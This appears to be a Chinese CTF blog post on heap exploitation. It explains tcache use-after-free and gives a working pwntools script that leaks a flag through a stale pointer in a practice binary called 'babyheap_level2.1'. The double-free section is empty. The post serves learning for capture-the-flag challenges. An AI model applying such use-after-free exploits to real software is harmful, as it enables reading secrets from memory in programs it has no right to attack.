---
layout: post
tags: [pwn]
title: "heap 利用手法"
author: wsxk
date: 2025-3-1
comments: true
---

- [1. tcache](#1-tcache)
  - [1.1 uaf(use after free)](#11-uafuse-after-free)
  - [1.2 double free](#12-double-free)

# 1. tcache<br>
## 1.1 uaf(use after free)<br>
常用的 tcache uaf是指，**分配一个内存A，由ptr指向；释放后ptr并没有置空；此时分配内存时再利用又分配了内存A，往其中写入机密信息；此时可皆由ptr来读出机密信息**<br>
```python
from pwn import *
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

binary_path = "./babyheap_level2.1"
libc_path = "./libc.so.6"

p = process(binary_path)


def malloc(size):
    p.recvuntil(b"[*] Function (malloc/free/puts/read_flag/quit): ")
    p.sendline(b"malloc")
    p.recvuntil(b"Size: ")
    p.sendline(str(size).encode())
    return

def free():
    p.recvuntil(b"[*] Function (malloc/free/puts/read_flag/quit): ")
    p.sendline(b"free")
    return

def read_flag():
    p.recvuntil(b"[*] Function (malloc/free/puts/read_flag/quit): ")
    p.sendline(b"read_flag")
    return

def puts():
    p.recvuntil(b"[*] Function (malloc/free/puts/read_flag/quit): ")
    p.sendline(b"puts")
    return

read_flag()
p.recvuntil(b"[*] flag_buffer = ")
chunk_addr1 = int(p.recvline().strip(b"\n"),16)
log.success(f"chunk_size:{hex(chunk_addr1)}")
read_flag()
p.recvuntil(b"[*] flag_buffer = ")
chunk_addr2 = int(p.recvline().strip(b"\n"),16)
log.success(f"chunk_size:{hex(chunk_addr2)}")

chunk_size = chunk_addr2 - chunk_addr1 -0x10
malloc(chunk_size)
free()
read_flag()#uaf
puts()

p.interactive()
```

## 1.2 double free<br>




<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>

